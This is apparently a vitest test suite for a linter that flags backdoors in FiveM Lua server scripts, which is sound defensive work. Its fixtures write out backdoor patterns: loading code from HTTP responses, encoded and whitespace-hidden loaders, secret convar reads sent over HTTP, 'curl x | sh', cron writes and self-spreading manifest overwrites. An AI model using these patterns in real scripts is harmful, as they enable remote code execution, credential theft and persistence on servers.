import { describe, expect, it } from "vitest";
import { securityRules } from "../src/index.js";

// Fixtures describe backdoor *shapes* (remote loader, encoded strings, secret reads); none of them is real malware.
const findings = (server: string, code: string) => securityRules("server.lua", server).findings.filter((f) => f.code === code);
const fires = (server: string, code: string) => findings(server, code).length > 0;
const escaped = (text: string) => [...text].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");

describe("suspicious script heuristics", () => {
  it("are warnings with heuristic confidence, never errors", () => {
    const [f] = findings("PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)", "LAB-SEC-101");
    expect(f).toMatchObject({ severity: "warning", confidence: "heuristic", path: "server.lua", line: 1 });
  });

  it("LAB-SEC-101: load of an HTTP response, not load of resource files", () => {
    expect(fires("PerformHttpRequest(url, function(e, d, h) pcall(function() assert(load(d))() end) end)", "LAB-SEC-101")).toBe(true);
    expect(fires("PerformHttpRequest(url, function(e, d) local fn = loadstring(d) fn() end, 'GET')", "LAB-SEC-101")).toBe(true);
    expect(fires("local chunk = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))", "LAB-SEC-101")).toBe(false);
    expect(fires("PerformHttpRequest(webhook, function(code) print(code) end, 'POST', json.encode({ content = 'log' }))", "LAB-SEC-101")).toBe(false);
  });

  it("LAB-SEC-102: load of decoded text, not of plain variables", () => {
    expect(fires("load(string.char(112, 114, 105, 110, 116))()", "LAB-SEC-102")).toBe(true);
    expect(fires(`load("${escaped("print('hi')")}")()`, "LAB-SEC-102")).toBe(true);
    expect(fires("assert(load(base64decode(payload)))()", "LAB-SEC-102")).toBe(true);
    expect(fires("local fn = load(code, '@chunk', 't', env)", "LAB-SEC-102")).toBe(false);
    expect(fires("load('return 1 + 1')()", "LAB-SEC-102")).toBe(false);
  });

  it("LAB-SEC-107: code hidden after a long run of spaces is a hard error, a comment there is not", () => {
    const hidden = `print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end\nprint('after')`;
    const [f] = findings(hidden, "LAB-SEC-107");
    expect(f).toMatchObject({ severity: "error", confidence: "confirmed", path: "server.lua", line: 2 });
    expect(fires(`print('ok')${" ".repeat(500)}-- note`, "LAB-SEC-107")).toBe(false);
    expect(fires(`local s = "${" ".repeat(399)}x"`, "LAB-SEC-107")).toBe(false);
    // A commented gap does not hide a later one with code; the line is where the second run starts.
    const twice = findings(`a()${" ".repeat(500)}-- note\nb()\n${"\t".repeat(450)}load(x)()`, "LAB-SEC-107");
    expect(twice).toMatchObject([{ line: 3 }]);
  });

  it("LAB-SEC-107: a huge run of spaces is checked in linear time", () => {
    const start = performance.now();
    expect(fires(`print('ok')${" ".repeat(500_000)}`, "LAB-SEC-107")).toBe(false);
    expect(performance.now() - start).toBeLessThan(100);
  });

  it("LAB-SEC-103: long encoded data, not short escapes or images", () => {
    expect(fires(`local s = "${escaped("x".repeat(50))}"`, "LAB-SEC-103")).toBe(true);
    expect(fires(`local s = "${"QUJD".repeat(120)}"`, "LAB-SEC-103")).toBe(true);
    expect(fires(`local s = string.char(${Array.from({ length: 25 }, () => 65).join(", ")})`, "LAB-SEC-103")).toBe(true);
    expect(fires('print("line one\\nline two\\t\\x41")', "LAB-SEC-103")).toBe(false);
    expect(fires(`local img = "data:image/png;base64,${"QUJD".repeat(200)}"`, "LAB-SEC-103")).toBe(false);
    expect(fires("local sep = string.char(10)", "LAB-SEC-103")).toBe(false);
  });

  it("LAB-SEC-104: secret convars; the database string only next to HTTP", () => {
    expect(fires("local key = GetConvar('sv_licenseKey', '')", "LAB-SEC-104")).toBe(true);
    expect(fires("local pw = GetConvar('rcon_password', '')", "LAB-SEC-104")).toBe(true);
    expect(fires("local db = GetConvar('mysql_connection_string', '')\nPerformHttpRequest(u, function() end, 'POST', db)", "LAB-SEC-104")).toBe(true);
    expect(fires("local db = GetConvar('mysql_connection_string', '')", "LAB-SEC-104")).toBe(false);
    expect(fires("local locale = GetConvar('ox:locale', 'en')", "LAB-SEC-104")).toBe(false);
  });

  it("LAB-SEC-105: raw public IPs and hidden URLs, not named hosts or local services", () => {
    expect(fires("PerformHttpRequest('http://203.0.113.9:8080/p', function() end)", "LAB-SEC-105")).toBe(true);
    expect(fires("local u = 'https://203.0.113.7/x'\nPerformHttpRequest(u, function() end)", "LAB-SEC-105")).toBe(true);
    expect(fires(`PerformHttpRequest("${escaped("https://example.com/")}", function() end)`, "LAB-SEC-105")).toBe(true);
    expect(fires("PerformHttpRequest('https://example.com/callback', function() end, 'POST')", "LAB-SEC-105")).toBe(false);
    expect(fires("PerformHttpRequest('http://127.0.0.1:3000/hook', function() end)", "LAB-SEC-105")).toBe(false);
    expect(fires("local ip = 'http://203.0.113.9/'", "LAB-SEC-105")).toBe(false); // no HTTP in the file
  });

  it("LAB-SEC-106: shell, writes outside the resource, spreading into computed resources", () => {
    expect(fires("os.execute('curl x | sh')", "LAB-SEC-106")).toBe(true);
    expect(fires("local p = io.popen('whoami')", "LAB-SEC-106")).toBe(true);
    expect(fires("local f = io.open('/etc/cron.d/x', 'w')", "LAB-SEC-106")).toBe(true);
    expect(fires("for i = 0, GetNumResources() - 1 do\n  local r = GetResourceByFindIndex(i)\n  SaveResourceFile(r, 'fxmanifest.lua', data, -1)\nend", "LAB-SEC-106")).toBe(true);
    expect(fires("local f = io.open(GetResourcePath(GetCurrentResourceName()) .. '/logs.txt', 'a')", "LAB-SEC-106")).toBe(false);
    expect(fires("local f = io.open(path, 'r')", "LAB-SEC-106")).toBe(false);
    expect(fires("local res = GetCurrentResourceName()\nSaveResourceFile(res, 'data.json', json.encode(t), -1)", "LAB-SEC-106")).toBe(false);
    expect(fires("SaveResourceFile('ox_doorlock', 'convert/x.lua', text, -1)", "LAB-SEC-106")).toBe(false);
    expect(fires("local cmd = 'ls \"'\nlocal dir = io.popen(cmd .. path .. '\"')", "LAB-SEC-106")).toBe(false);
  });
});
